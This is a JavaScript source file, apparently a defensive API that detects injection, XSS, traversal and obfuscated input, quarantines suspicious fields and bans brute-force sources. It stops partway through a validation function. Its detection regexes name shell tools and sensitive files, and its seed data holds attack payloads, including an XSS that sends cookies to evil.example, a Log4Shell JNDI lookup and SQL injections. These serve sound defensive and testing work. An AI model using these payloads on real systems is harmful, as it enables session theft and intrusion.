/*!
 * Xeno Shield API  ·  v2026-10-19
 * By Jonathan (Roodie77).
 *
 * A defensive API for websites and apps with two jobs:
 *   1. QUARANTINE BAD DATA   – inspect incoming fields for injection, XSS, traversal,
 *                              obfuscation and encoding evasion, and hold the nasty
 *                              ones in a reviewable quarantine.
 *   2. STOP ABUSE            – brute force, credential stuffing, password spraying and
 *                              distributed attacks on a single account, with escalating bans.
 *
 * It is a complete HTTP-semantics engine that runs in the page (or in Node):
 * routing, auth, validation, optimistic concurrency, idempotency, pagination,
 * rate limiting and persistence. `service.fetch()` has the same signature as
 * window.fetch and resolves with real Response objects.
 *
 *   XenoAPI.service.fetch('/v1/quarantine?severity=high,critical')
 */
(function (root, factory) {
  const api = factory();
  if (typeof module === 'object' && module.exports) module.exports = api;
  else root.XenoAPI = api;
})(typeof self !== 'undefined' ? self : globalThis, function () {
  'use strict';

  /* ───────────────────────── constants ───────────────────────── */

  const API_VERSION = '2026-10-19';
  const BASE = 'https://api.xeno.local';
  const DEMO_TOKEN = 'xeno_demo_key';
  const PROBLEM_NS = BASE + '/problems/';
  const STORE_KEY = 'xeno-shield-v1';

  const CASE_STATUSES = ['quarantined', 'released', 'confirmed'];
  // Review workflow. Anything not listed here is a 409.
  const CASE_TRANSITIONS = {
    quarantined: ['released', 'confirmed'],
    released: ['quarantined'],
    confirmed: ['quarantined'],
  };
  const SEVERITIES = ['low', 'medium', 'high', 'critical'];
  const GUARD_SCOPES = ['login', 'signup', 'api', 'password-reset'];
  const BAN_SCOPES = [...GUARD_SCOPES, 'all'];
  const BAN_KINDS = ['ip', 'identity', 'fingerprint'];
  const MAX_BAN_SECONDS = 30 * 24 * 3600;

  const RATE_CAPACITY = 60;
  const RATE_REFILL_PER_SEC = 10;
  const IDEMPOTENCY_TTL_MS = 24 * 3600 * 1000;
  const ANALYSIS_LIMIT = 20000;

  const STATUS_TEXT = {
    200: 'OK', 201: 'Created', 204: 'No Content', 304: 'Not Modified', 400: 'Bad Request', 401: 'Unauthorized',
    403: 'Forbidden', 404: 'Not Found', 405: 'Method Not Allowed', 409: 'Conflict', 410: 'Gone', 412: 'Precondition Failed',
    415: 'Unsupported Media Type', 422: 'Unprocessable Content', 428: 'Precondition Required',
    429: 'Too Many Requests', 500: 'Internal Server Error',
  };

  /* ───────────────────────── helpers ───────────────────────── */

  class ApiError extends Error {
    constructor(status, slug, title, detail, extra) {
      super(detail || title);
      const { headers, ...rest } = extra || {};
      this.status = status;
      this.slug = slug;
      this.title = title;
      this.detail = detail;
      this.headers = headers || {};
      this.extra = rest;
    }
  }

  const isObj = (v) => v !== null && typeof v === 'object' && !Array.isArray(v);
  const iso = (ms) => new Date(ms === undefined ? Date.now() : ms).toISOString();
  const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
  const rand36 = (n) => Array.from({ length: n }, () => Math.floor(Math.random() * 36).toString(36)).join('');
  const clone = (v) => JSON.parse(JSON.stringify(v));
  const newId = (prefix) => prefix + '_' + Date.now().toString(36).padStart(9, '0') + rand36(4);

  function fnv(str, seed) {
    let h = seed >>> 0;
    for (let i = 0; i < str.length; i++) {
      h ^= str.charCodeAt(i);
      h = Math.imul(h, 16777619) >>> 0;
    }
    return h;
  }
  const hex16 = (s) => fnv(s, 2166136261).toString(16).padStart(8, '0') + fnv(s, 0x9747b28c).toString(16).padStart(8, '0');
  const etagOf = (r) => `"${r.version}-${fnv(r.id + ':' + r.version, 5).toString(16).padStart(8, '0')}"`;

  function pick(obj, paths) {
    const out = {};
    for (const p of paths) {
      const [a, b] = p.split('.');
      if (!(a in obj)) continue;
      if (b === undefined) out[a] = obj[a];
      else if (isObj(obj[a])) (out[a] = out[a] || {})[b] = obj[a][b];
    }
    out.id = obj.id;
    return out;
  }

  function mergePatch(target, patch) {
    if (!isObj(patch)) return patch;
    const out = isObj(target) ? { ...target } : {};
    for (const [k, v] of Object.entries(patch)) {
      if (v === null) delete out[k];
      else out[k] = mergePatch(out[k], v);
    }
    return out;
  }

  function diff(a, b) {
    const out = {};
    for (const k of Object.keys(a)) if (JSON.stringify(a[k]) !== JSON.stringify(b[k])) out[k] = { from: a[k], to: b[k] };
    return out;
  }

  function b64e(s) { return btoa(unescape(encodeURIComponent(s))).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, ''); }
  function b64d(s) { return decodeURIComponent(escape(atob(s.replace(/-/g, '+').replace(/_/g, '/')))); }

  function makeStorage() {
    let mem = null;
    let ls = null;
    try { if (typeof localStorage !== 'undefined') ls = localStorage; } catch (e) { ls = null; }
    return {
      load() { try { const raw = ls ? ls.getItem(STORE_KEY) : mem; return raw ? JSON.parse(raw) : null; } catch (e) { return null; } },
      save(state) { const raw = JSON.stringify(state); try { if (ls) ls.setItem(STORE_KEY, raw); else mem = raw; } catch (e) { mem = raw; } },
    };
  }

  const validationError = (errors) =>
    new ApiError(422, 'validation-failed', 'Validation failed', `${errors.length} problem${errors.length === 1 ? '' : 's'} with the request body.`, { errors });

  function validIp(s) {
    const v4 = /^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/.exec(s);
    if (v4) return v4.slice(1).every((o) => Number(o) <= 255);
    return s.length <= 45 && /^[0-9a-f:.]+$/i.test(s) && (s.match(/:/g) || []).length >= 2;
  }

  /** Small validation kit shared by every resource. */
  function makeCheck(input, errors) {
    const err = (pointer, code, message) => errors.push({ pointer, code, message });
    return {
      err,
      unknown(allowed, readOnly) {
        for (const k of Object.keys(input)) {
          if (readOnly && readOnly.has(k)) err('/' + k, 'read_only', `"${k}" is assigned by the server and cannot be written.`);
          else if (!allowed.has(k)) err('/' + k, 'unknown_field', `"${k}" is not a writable field.`);
        }
      },
      str(key, out, o) {
        const val = input[key];
        if (val === undefined || (val === null && !o.required)) {
          if (o.required) err('/' + key, 'required', `${key} is required.`); else out[key] = o.def;
          return;
        }
        if (typeof val !== 'string') return err('/' + key, 'type', `${key} must be a string.`);
        const s = o.raw ? val : val.trim();
        if (s.length < (o.min || 0) || s.length > o.max) return err('/' + key, 'length', `${key} must be ${o.min || 0}–${o.max} characters.`);
        if (o.pattern && !o.pattern.test(s)) return err('/' + key, 'format', o.patternMsg || `${key} has an invalid format.`);
        out[key] = o.lower ? s.toLowerCase() : s;
      },
      enm(key, out, list, def) {
        const val = input[key];
        if (val === undefined || val === null) { if (def === undefined) err('/' + key, 'required', `${key} is required.`); else out[key] = def; return; }
        if (!list.includes(val)) return err('/' + key, 'enum', `${key} must be one of: ${list.join(', ')}.`);
        out[key] = val;
      },
      tags(key, out) {
        const val = input[key];
        if (val === undefined || val === null) { out[key] = []; return; }
        if (!Array.isArray(val) || val.length > 8) return err('/' + key, 'type', `${key} must be an array of at most 8 items.`);
        const bad = val.findIndex((t) => typeof t !== 'string' || !/^[a-z0-9][a-z0-9-]{0,19}$/.test(t));
        if (bad !== -1) return err(`/${key}/${bad}`, 'format', 'each label must be a lowercase slug (a–z, 0–9, hyphen) of 1–20 characters.');
        if (new Set(val).size !== val.length) return err('/' + key, 'unique', `${key} must be unique.`);
        out[key] = [...val];
      },
    };
  }

  /* ───────────────────────── bad-data detection ───────────────────────── */

  // Heuristic detectors. Each rule has a weight; a field's score is the sum of the
  // distinct rules that fire (capped at 100). Every pattern is bounded to avoid ReDoS.
  const RULES = [
    { id: 'sqli.union-select', cat: 'sqli', w: 45, re: /\bunion\b[\s\S]{0,20}\bselect\b/i },
    { id: 'sqli.tautology', cat: 'sqli', w: 50, re: /['"`]\s*(?:or|and)\s+['"`]?\w+['"`]?\s*=\s*['"`]?\w+/i },
    { id: 'sqli.stacked-query', cat: 'sqli', w: 55, re: /;\s*(?:drop|delete|truncate|insert|update|alter|create|exec)\b/i },
    { id: 'sqli.comment-tail', cat: 'sqli', w: 25, re: /['"`)]\s*(?:--|#|\/\*)/ },
    { id: 'sqli.time-based', cat: 'sqli', w: 50, re: /\b(?:sleep|pg_sleep|benchmark|waitfor\s+delay)\b\s*\(?\s*['"]?\d/i },
    { id: 'xss.script-tag', cat: 'xss', w: 60, re: /<\s*script\b/i },
    { id: 'xss.event-handler', cat: 'xss', w: 50, re: /<[^>]{0,200}\bon[a-z]+\s*=/i },
    { id: 'xss.js-uri', cat: 'xss', w: 50, re: /\bjavascript\s*:/i },
    { id: 'xss.embed-tag', cat: 'xss', w: 45, re: /<\s*(?:iframe|object|embed|svg)\b/i },
    { id: 'traversal.dotdot', cat: 'path-traversal', w: 50, re: /(?:\.\.[/\\]){2,}/ },
    { id: 'traversal.sensitive-file', cat: 'path-traversal', w: 55, re: /(?:\/etc\/(?:passwd|shadow)|\bwin\.ini\b|c:\\windows\\)/i },
    { id: 'cmdi.shell-chain', cat: 'command-injection', w: 55, re: /(?:;|&&|\|\||\|)\s*(?:cat|ls|rm|curl|wget|nc|ncat|bash|sh|powershell|whoami|id)\b/i },
    { id: 'cmdi.substitution', cat: 'command-injection', w: 50, re: /\$\([^)]{0,200}\)|`[^`]{1,200}`/ },
    { id: 'jndi.lookup', cat: 'template-injection', w: 90, re: /\$\{\s*(?:jndi|env|sys)\s*:/i },
    { id: 'ssti.expression', cat: 'template-injection', w: 35, re: /\{\{[^}]{0,80}(?:constructor|__class__|config|self)[^}]{0,80}\}\}/i },
    { id: 'proto.pollution', cat: 'prototype-pollution', w: 55, re: /__proto__|constructor\s*\.\s*prototype/i },
    { id: 'null.byte', cat: 'malformed', w: 40, re: /\u0000/ },
    { id: 'obf.eval', cat: 'obfuscation', w: 40, re: /\b(?:eval|atob|fromcharcode|unescape)\s*\(/i },
    { id: 'obf.base64-blob', cat: 'obfuscation', w: 30, re: /[A-Za-z0-9+/]{80,}={0,2}/ },
  ];

  /** Defeat common evasion: Unicode compatibility forms (fullwidth chars) and repeated %-encoding. */
  function normalizeInput(input) {
    let s = String(input);
    try { s = s.normalize('NFKC'); } catch (e) { /* keep raw */ }
    let decoded = s;
    for (let i = 0; i < 2; i++) {
      try {
        const d = decodeURIComponent(decoded.replace(/%(?![0-9a-f]{2})/gi, '%25'));
        if (d === decoded) break;
        decoded = d;
      } catch (e) { break; }
    }
    return { text: decoded, changed: decoded !== s };
  }

  const clip = (s) => s.replace(/[\u0000-\u001f]/g, '·').slice(0, 48);

  const severityOf = (score) => (score >= 85 ? 'critical' : score >= 60 ? 'high' : score >= 30 ? 'medium' : score > 0 ? 'low' : 'none');

  function analyze(input, policy) {
    const original = String(input);
    const n = normalizeInput(original.slice(0, ANALYSIS_LIMIT));
    const findings = [];
    for (const r of RULES) {
      const m = r.re.exec(n.text);
      if (m) findings.push({ rule: r.id, category: r.cat, weight: r.w, evidence: clip(m[0]) });
    }
    if (findings.length && n.changed) findings.push({ rule: 'evasion.encoding', category: 'evasion', weight: 15, evidence: 'matched only after URL-decoding' });
    if (original.length > policy.max_field_length) findings.push({ rule: 'size.oversized', category: 'oversized', weight: 25, evidence: `${original.length} chars (limit ${policy.max_field_length})` });
    const score = Math.min(100, findings.reduce((a, f) => a + f.weight, 0));
    const top = [...findings].sort((a, b) => b.weight - a.weight)[0];
    return {
      score,
      severity: severityOf(score),
      category: top ? top.category : 'manual',
      categories: [...new Set(findings.map((f) => f.category))],
      findings,
    };
  }

  const fingerprintOf = (source, text) => hex16(source.toLowerCase() + '\u241f' + text.toLowerCase().replace(/\s+/g, ' ').trim());

  /* ───────────────────────── policies ───────────────────────── */

  const GUARD_NUMBERS = {
    window_seconds: { min: 1, max: 3600, int: true },
    max_failures: { min: 1, max: 1000, int: true },
    max_identities: { min: 2, max: 1000, int: true },
    spray_threshold: { min: 2, max: 1000, int: true },
    ban_base_seconds: { min: 1, max: 86400, int: true },
    ban_multiplier: { min: 1, max: 10, int: false },
    ban_max_seconds: { min: 1, max: MAX_BAN_SECONDS, int: true },
  };
  const INSPECTION_NUMBERS = {
    quarantine_score: { min: 1, max: 100, int: true },
    max_field_length: { min: 100, max: 100000, int: true },
  };

  const DEFAULT_POLICIES = {
    inspection: { quarantine_score: 40, max_field_length: 2000 },
    login: { window_seconds: 60, max_failures: 5, max_identities: 8, spray_threshold: 5, ban_base_seconds: 60, ban_multiplier: 2, ban_max_seconds: 86400, counts: 'failures' },
    signup: { window_seconds: 300, max_failures: 10, max_identities: 20, spray_threshold: 10, ban_base_seconds: 300, ban_multiplier: 2, ban_max_seconds: 86400, counts: 'all' },
    api: { window_seconds: 10, max_failures: 50, max_identities: 100, spray_threshold: 50, ban_base_seconds: 30, ban_multiplier: 2, ban_max_seconds: 3600, counts: 'all' },
    'password-reset': { window_seconds: 600, max_failures: 3, max_identities: 5, spray_threshold: 5, ban_base_seconds: 600, ban_multiplier: 3, ban_max_seconds: 86400, counts: 'all' },
  };

  function validatePolicy(scope, input) {
    const errors = [];
    const chk = makeCheck(input, errors);
    if (!isObj(input)) return { errors: [{ pointer: '', code: 'type', message: 'Body must be a JSON object.' }] };
    const nums = scope === 'inspection' ? INSPECTION_NUMBERS : GUARD_NUMBERS;
    const allowed = new Set([...Object.keys(nums), ...(scope === 'inspection' ? [] : ['counts'])]);
    chk.unknown(allowed, new Set(['scope', 'object', 'version', 'updated_at', 'id']));
    const v = {};
    for (const [k, o] of Object.entries(nums)) {
      const x = input[k];
      if (x === undefined) { chk.err('/' + k, 'required', `${k} is required.`); continue; }
      if (typeof x !== 'number' || !Number.isFinite(x) || (o.int && !Number.isInteger(x)) || x < o.min || x > o.max) {
        chk.err('/' + k, 'range', `${k} must be ${o.int ? 'an integer' : 'a number'} between ${o.min} and ${o.max}.`);
      } else v[k] = x;
    }
    if (scope !== 'inspection') chk.enm('counts', v, ['failures', 'all']);
    if (!errors.length && scope !== 'inspection' && v.ban_max_seconds < v.ban_base_seconds) {
      chk.err('/ban_max_seconds', 'invariant', 'ban_max_seconds cannot be smaller than ban_base_seconds.');
    }
    return { value: errors.length ? undefined : v, errors };
  }

  /* ───────────────────────── seed data ───────────────────────── */

  const CASE_SEEDS = [
    { id: 'qr_seed_tautology', source: 'login-form', field: 'username', payload: "admin' OR '1'='1' --", status: 'confirmed', hits: 14, labels: ['sqli', 'bot'], note: 'Classic tautology. Source IP is banned.', age: 30 },
    { id: 'qr_seed_xss', source: 'comment-box', field: 'body', payload: "<img src=x onerror=fetch('//evil.example/c?='+document.cookie)>", status: 'quarantined', hits: 3, labels: ['cookie-theft'], note: '', age: 20 },
    { id: 'qr_seed_traversal', source: 'file-download', field: 'path', payload: '../../../../etc/passwd', status: 'quarantined', hits: 6, labels: ['scanner'], note: '', age: 12 },
    { id: 'qr_seed_jndi', source: 'search', field: 'q', payload: '${jndi:ldap://203.0.113.9/a}', status: 'quarantined', hits: 21, labels: ['log4shell'], note: '', age: 8 },
    { id: 'qr_seed_falsepos', source: 'profile', field: 'bio', payload: 'Union Select Committee: help us select our next chair', status: 'released', hits: 2, labels: ['false-positive'], note: 'Legitimate bio text from a real member.', age: 6 },
    { id: 'qr_seed_blob', source: 'webhook', field: 'body', payload: "eval(atob('" + 'QUJD'.repeat(30) + "'))", status: 'quarantined', hits: 1, labels: ['obfuscated'], note: '', age: 3 },
    { id: 'qr_seed_bobby', source: 'signup', field: 'display_name', payload: "Robert'); DROP TABLE Students;--", status: 'confirmed', hits: 5, labels: ['sqli'], note: 'Little Bobby Tables, as expected.', age: 1 },
  ];

  const BAN_SEEDS = [
    { id: 'ban_seed_bruteforce', kind: 'ip', value: '203.0.113.50', scope: 'login', reason: 'brute-force', duration: 7200, by: 'guard', strikes: 1, hits: 38, age: 6 },
    { id: 'ban_seed_spray', kind: 'fingerprint', value: 'pw_5f4dcc3b', scope: 'login', reason: 'password-spraying', duration: 86400, by: 'guard', strikes: 0, hits: 112, age: 3 },
    { id: 'ban_seed_scanner', kind: 'ip', value: '198.51.100.23', scope: 'all', reason: 'Known scanner hammering /admin on every app', duration: 0, by: 'api', strikes: 0, hits: 407, age: 2 },
  ];

  function emptyState() {
    return {
      v: 1, cases: {}, bans: {}, policies: {}, history: {}, idem: {},
      metrics: { inspected: 0, quarantined: 0, allowed: 0, allow: 0, throttle: 0, block: 0 },
    };
  }

  function seedState() {
    const now = Date.now();
    const s = emptyState();
    for (const [scope, p] of Object.entries(DEFAULT_POLICIES)) {
      s.policies[scope] = { id: 'pol_' + scope, scope, ...p, version: 1, updated_at: iso(now) };
    }
    CASE_SEEDS.forEach((c, i) => {
      const t = iso(now - c.age * 3600 * 1000 - i * 1000);
      const a = analyze(c.payload, DEFAULT_POLICIES.inspection);
      s.cases[c.id] = {
        id: c.id, source: c.source, field: c.field, payload: c.payload, payload_length: c.payload.length, status: c.status,
        reviewer_note: c.note, labels: c.labels, ...a, fingerprint: fingerprintOf(c.source, c.payload), hits: c.hits,
        version: 1, created_at: t, updated_at: t, last_seen_at: t, deleted_at: null,
      };
      s.history[c.id] = [{ seq: 1, type: 'created', at: t, version: 1, actor: 'seed', request_id: 'req_seed', changes: null }];
    });
    BAN_SEEDS.forEach((b, i) => {
      const t = iso(now - b.age * 60 * 1000 - i * 1000);
      s.bans[b.id] = {
        id: b.id, kind: b.kind, value: b.value, scope: b.scope, reason: b.reason, duration_seconds: b.duration,
        started_at: t, expires_at: b.duration ? iso(Date.parse(t) + b.duration * 1000) : null,
        created_by: b.by, strikes: b.strikes, hits: b.hits, version: 1, created_at: t, updated_at: t, deleted_at: null,
      };
      s.history[b.id] = [{ seq: 1, type: 'created', at: t, version: 1, actor: 'seed', request_id: 'req_seed', changes: null }];
    });
    return s;
  }

  /* ───────────────────────── presenters ───────────────────────── */

  const presentCase = (r) => ({
    id: r.id, object: 'quarantine_case', source: r.source, field: r.field, payload: r.payload, payload_length: r.payload_length,
    status: r.status, reviewer_note: r.reviewer_note, labels: [...r.labels],
    category: r.category, categories: [...r.categories], severity: r.severity, score: r.score, findings: clone(r.findings),
    fingerprint: r.fingerprint, hits: r.hits, last_seen_at: r.last_seen_at,
    version: r.version, created_at: r.created_at, updated_at: r.updated_at, deleted_at: r.deleted_at,
    links: { self: `/v1/quarantine/${r.id}`, history: `/v1/quarantine/${r.id}/history` },
  });

  const banActive = (r, now) => !r.deleted_at && (r.expires_at === null || Date.parse(r.expires_at) > (now || Date.now()));

  const presentBan = (r) => ({
    id: r.id, object: 'ban', kind: r.kind, value: r.value, scope: r.scope, reason: r.reason,
    duration_seconds: r.duration_seconds, started_at: r.started_at, expires_at: r.expires_at, active: banActive(r),
    created_by: r.created_by, strikes: r.strikes, hits: r.hits,
    version: r.version, created_at: r.created_at, updated_at: r.updated_at, deleted_at: r.deleted_at,
    links: { self: `/v1/bans/${r.id}`, history: `/v1/bans/${r.id}/history` },
  });

  const presentPolicy = (p) => {
    const { id, ...rest } = p;
    return { object: 'policy', ...rest };
  };

  /* ───────────────────────── service ───────────────────────── */

  function createService(opts) {
    opts = opts || {};
    const storage = opts.storage || makeStorage();
    const latency = opts.latency === undefined ? [30, 110] : opts.latency;
    let state = storage.load();
    if (!state || state.v !== 1 || !state.cases) { state = seedState(); storage.save(state); }
    let attempts = []; // sliding window of guard events (in memory only)
    const limiter = { tokens: RATE_CAPACITY, t: Date.now() };
    const save = () => storage.save(state);

    function record(rec, type, reqId, changes, actor) {
      const log = state.history[rec.id] || (state.history[rec.id] = []);
      log.push({ seq: log.length + 1, type, at: rec.updated_at, version: rec.version, actor: actor || 'api', request_id: reqId, changes: changes || null });
    }

    function precondition(req, rec) {
      const h = req.headers['if-match'];
      if (h === undefined) {
        throw new ApiError(428, 'precondition-required', 'Precondition required',
          'This write needs an If-Match header carrying the ETag from your last read, so concurrent edits cannot silently overwrite each other.',
          { headers: { ETag: etagOf(rec) } });
      }
      if (h.trim() === '*') return;
      const sent = h.split(',').map((s) => s.trim().replace(/^W\//, ''));
      if (!sent.includes(etagOf(rec))) {
        throw new ApiError(412, 'precondition-failed', 'Precondition failed',
          `This record changed since you read it (it is now at version ${rec.version}). Re-fetch, merge, and retry.`,
          { current_version: rec.version, headers: { ETag: etagOf(rec) } });
      }
    }

    function idempotency(c) {
      const key = c.req.headers['idempotency-key'];
      if (key === undefined) return {};
      if (key.length < 1 || key.length > 100) throw new ApiError(400, 'invalid-header', 'Invalid Idempotency-Key', 'Idempotency-Key must be 1–100 characters.');
      const fp = c.req.method + ' ' + c.req.path + ' ' + (c.req.body || '').trim();
      const now = Date.now();
      for (const [k, e] of Object.entries(state.idem)) if (now - e.at > IDEMPOTENCY_TTL_MS) delete state.idem[k];
      const hit = state.idem[key];
      if (hit) {
        if (hit.fp !== fp) throw new ApiError(422, 'idempotency-key-reuse', 'Idempotency-Key reused', 'This Idempotency-Key was already used with a different request. Use a fresh key for a different operation.');
        return { replay: { status: hit.status, headers: { ...hit.headers, 'Idempotent-Replayed': 'true' }, body: clone(hit.body) } };
      }
      return { key, fp };
    }

    /* ── pagination shared by every list endpoint ── */

    function listing(c, cfg) {
      const q = c.query;
      const errors = [];
      const bad = (name, message) => errors.push({ pointer: '?' + name, code: 'invalid', message });
      const csv = (name) => (q.get(name) ? q.get(name).split(',').map((s) => s.trim()).filter(Boolean) : null);
      const num = (name, o) => {
        const raw = q.get(name);
        if (raw === null || raw === '') return undefined;
        const n = Number(raw);
        if (!Number.isFinite(n) || (o.int && !Number.isInteger(n)) || n < o.min || n > o.max) { bad(name, `${name} must be ${o.int ? 'an integer' : 'a number'} between ${o.min} and ${o.max}.`); return undefined; }
        return n;
      };
      const oneOf = (name, list) => { const v = csv(name); if (v && v.some((x) => !list.includes(x))) bad(name, `${name} must be a comma-separated subset of: ${list.join(', ')}.`); return v; };

      const limit = num('limit', { int: true, min: 1, max: 50 }) || 10;
      const includeDeleted = q.get('include_deleted') === 'true';
      const fields = csv('fields');
      if (fields) for (const f of fields) if (!cfg.fieldPaths.includes(f)) bad('fields', `Unknown field "${f}".`);
      const predicate = cfg.parse({ q, csv, num, bad, oneOf });

      const sortSpec = (q.get('sort') || '-created_at').split(',').map((s) => s.trim()).filter(Boolean);
      const sort = sortSpec.map((s) => ({ key: s.replace(/^-/, ''), dir: s.startsWith('-') ? -1 : 1 }));
      for (const s of sort) if (!cfg.sortable.includes(s.key)) bad('sort', `Cannot sort by "${s.key}". Sortable: ${cfg.sortable.join(', ')}.`);
      if (errors.length) throw new ApiError(400, 'invalid-parameter', 'Invalid query parameter', `${errors.length} query parameter${errors.length === 1 ? ' is' : 's are'} invalid.`, { errors });

      const keysOf = (r) => sort.map((s) => cfg.valueOf(r, s.key));
      const compare = (ak, aid, bk, bid) => {
        for (let i = 0; i < sort.length; i++) {
          if (ak[i] < bk[i]) return -1 * sort[i].dir;
          if (ak[i] > bk[i]) return 1 * sort[i].dir;
        }
        return aid < bid ? -1 : aid > bid ? 1 : 0;
      };

      let rows = Object.values(state[cfg.key]).filter((r) => (includeDeleted || !r.deleted_at) && predicate(r));
      rows.sort((a, b) => compare(keysOf(a), a.id, keysOf(b), b.id));
      const total = rows.length;

      const sortSig = sortSpec.join(',');
      const rawCursor = q.get('cursor');
      if (rawCursor) {
        let cur;
        try { cur = JSON.parse(b64d(rawCursor)); } catch (e) { cur = null; }
        if (!cur || !Array.isArray(cur.k) || cur.s !== sortSig) {
          throw new ApiError(400, 'invalid-cursor', 'Invalid cursor', 'The cursor is malformed, or was issued for a different sort order. Start again without a cursor.');
        }
        rows = rows.filter((r) => compare(keysOf(r), r.id, cur.k, cur.id) > 0);
      }

      const pageRows = rows.slice(0, limit);
      const hasMore = rows.length > limit;
      const last = pageRows[pageRows.length - 1];
      const next = hasMore && last ? b64e(JSON.stringify({ k: keysOf(last), id: last.id, s: sortSig })) : null;
      const headers = { 'X-Total-Count': String(total) };
      if (next) {
        const nq = new URLSearchParams(q);
        nq.set('cursor', next);
        headers.Link = `<${cfg.base}?${nq.toString()}>; rel="next"`;
      }
      return {
        status: 200, headers,
        body: { data: pageRows.map((r) => (fields ? pick(cfg.present(r), fields) : cfg.present(r))), page: { limit, count: pageRows.length, total, has_more: hasMore, next_cursor: next } },
      };
    }

    /* ── generic CRUD over a stored resource ── */

    function crud(cfg) {
      const find = (id, allowDeleted) => {
        const r = state[cfg.key][id];
        if (!r) throw new ApiError(404, 'not-found', `${cfg.label} not found`, `No ${cfg.label} with id "${id}" exists.`);
        if (r.deleted_at && !allowDeleted) {
          throw new ApiError(410, 'gone', `${cfg.label} was deleted`, `${cfg.label} "${id}" was deleted at ${r.deleted_at}. POST to its restore link to bring it back.`,
            { deleted_at: r.deleted_at, restore: `${cfg.base}/${id}/restore`, headers: { ETag: etagOf(r) } });
        }
        return r;
      };

      function commit(rec, next, reqId) {
        const prev = cfg.view(rec);
        const rules = cfg.rules(next, rec);
        if (rules.length) throw validationError(rules);
        const imm = (cfg.immutable || []).filter((k) => JSON.stringify(prev[k]) !== JSON.stringify(next[k]))
          .map((k) => ({ pointer: '/' + k, code: 'immutable', message: `"${k}" cannot be changed after creation.` }));
        if (imm.length) throw validationError(imm);
        if (cfg.transitions && next.status !== rec.status && !cfg.transitions[rec.status].includes(next.status)) {
          throw new ApiError(409, 'illegal-transition', 'Illegal status transition', `A ${cfg.label} cannot go from "${rec.status}" to "${next.status}".`,
            { from: rec.status, to: next.status, allowed: cfg.transitions[rec.status] });
        }
        if (cfg.unique) cfg.unique(next, rec.id);
        const changes = diff(prev, next);
        if (!Object.keys(changes).length) return { status: 200, headers: { ETag: etagOf(rec), 'X-Change': 'none' }, body: cfg.present(rec) };
        cfg.apply(rec, next);
        rec.version += 1;
        rec.updated_at = iso();
        record(rec, 'updated', reqId, changes);
        save();
        return { status: 200, headers: { ETag: etagOf(rec) }, body: cfg.present(rec) };
      }

      return {
        list: (c) => listing(c, cfg.list),

        create(c) {
          const idem = idempotency(c);
          if (idem.replay) return idem.replay;
          const { value, errors } = cfg.validate(c.body);
          if (errors.length) throw validationError(errors);
          const rules = cfg.rules(value, null);
          if (rules.length) throw validationError(rules);
          if (cfg.unique) cfg.unique(value, null);
          const rec = cfg.build(value);
          state[cfg.key][rec.id] = rec;
          record(rec, 'created', c.reqId, null);
          const res = { status: 201, headers: { Location: `${cfg.base}/${rec.id}`, ETag: etagOf(rec) }, body: cfg.present(rec) };
          if (idem.key) state.idem[idem.key] = { fp: idem.fp, at: Date.now(), status: res.status, headers: res.headers, body: clone(res.body) };
          save();
          return res;
        },

        read(c) {
          const rec = find(c.params.id);
          const tag = etagOf(rec);
          const inm = c.req.headers['if-none-match'];
          if (inm && (inm.trim() === '*' || inm.split(',').map((s) => s.trim().replace(/^W\//, '')).includes(tag))) return { status: 304, headers: { ETag: tag } };
          return { status: 200, headers: { ETag: tag }, body: cfg.present(rec) };
        },

        replace(c) {
          const rec = find(c.params.id);
          precondition(c.req, rec);
          const { value, errors } = cfg.validate(c.body);
          if (errors.length) throw validationError(errors);
          return commit(rec, value, c.reqId);
        },

        patch(c) {
          const rec = find(c.params.id);
          precondition(c.req, rec);
          if (!isObj(c.body)) throw validationError([{ pointer: '', code: 'type', message: 'A merge patch must be a JSON object.' }]);
          const { value, errors } = cfg.validate(mergePatch(cfg.view(rec), c.body));
          if (errors.length) throw validationError(errors);
          return commit(rec, value, c.reqId);
        },

        remove(c) {
          const rec = find(c.params.id, true);
          const purge = c.query.get('purge') === 'true';
          if (rec.deleted_at && !purge) find(c.params.id); // throws 410
          precondition(c.req, rec);
          if (purge) {
            if (!rec.deleted_at) throw new ApiError(409, 'purge-requires-tombstone', 'Purge requires a tombstone', `Only an already-deleted ${cfg.label} can be purged. DELETE it once first, then DELETE with ?purge=true.`);
            delete state[cfg.key][rec.id];
            delete state.history[rec.id];
            save();
            return { status: 204 };
          }
          rec.deleted_at = iso();
          rec.updated_at = rec.deleted_at;
          rec.version += 1;
          record(rec, 'deleted', c.reqId, null);
          save();
          return { status: 204, headers: { ETag: etagOf(rec) } };
        },

        restore(c) {
          const rec = find(c.params.id, true);
          if (!rec.deleted_at) throw new ApiError(409, 'not-deleted', `${cfg.label} is not deleted`, `Only a deleted ${cfg.label} can be restored.`);
          if (cfg.unique) cfg.unique(cfg.view(rec), rec.id);
          rec.deleted_at = null;
          if (cfg.onRestore) cfg.onRestore(rec);
          rec.updated_at = iso();
          rec.version += 1;
          record(rec, 'restored', c.reqId, null);
          save();
          return { status: 200, headers: { ETag: etagOf(rec) }, body: cfg.present(rec) };
        },

        history(c) {
          find(c.params.id, true);
          const events = [...(state.history[c.params.id] || [])].reverse();
          return { status: 200, body: { data: events, page: { count: events.length } } };
        },
      };
    }

    /* ── quarantine cases ── */

    const CASE_WRITABLE = new Set(['source', 'field', 'payload', 'status', 'reviewer_note', 'labels']);
    const CASE_READ_ONLY = new Set(['id', 'object', 'payload_length', 'category', 'categories', 'severity', 'score', 'findings', 'fingerprint', 'hits', 'last_seen_at', 'version', 'created_at', 'updated_at', 'deleted_at', 'links']);

    function validateCase(input) {
      const errors = [];
      const chk = makeCheck(input, errors);
      if (!isObj(input)) return { errors: [{ pointer: '', code: 'type', message: 'Body must be a JSON object.' }] };
      chk.unknown(CASE_WRITABLE, CASE_READ_ONLY);
      const v = {};
      chk.str('source', v, { required: true, min: 2, max: 40, pattern: /^[\w .:/-]+$/, patternMsg: 'source may contain letters, digits, spaces and . : / _ - only.' });
      chk.str('field', v, { min: 1, max: 40, def: null, pattern: /^[\w.[\]-]+$/, patternMsg: 'field may contain letters, digits and . _ - [ ] only.' });
      chk.str('payload', v, { required: true, min: 1, max: 4000, raw: true });
      chk.enm('status', v, CASE_STATUSES, 'quarantined');
      chk.str('reviewer_note', v, { max: 500, def: '' });
      chk.tags('labels', v);
      return { value: errors.length ? undefined : v, errors };
    }

    function caseRules(next, prev) {
      const errors = [];
      const err = (pointer, code, message) => errors.push({ pointer, code, message });
      if (!prev && next.status !== 'quarantined') err('/status', 'invalid_initial_state', 'A new case must start as "quarantined".');
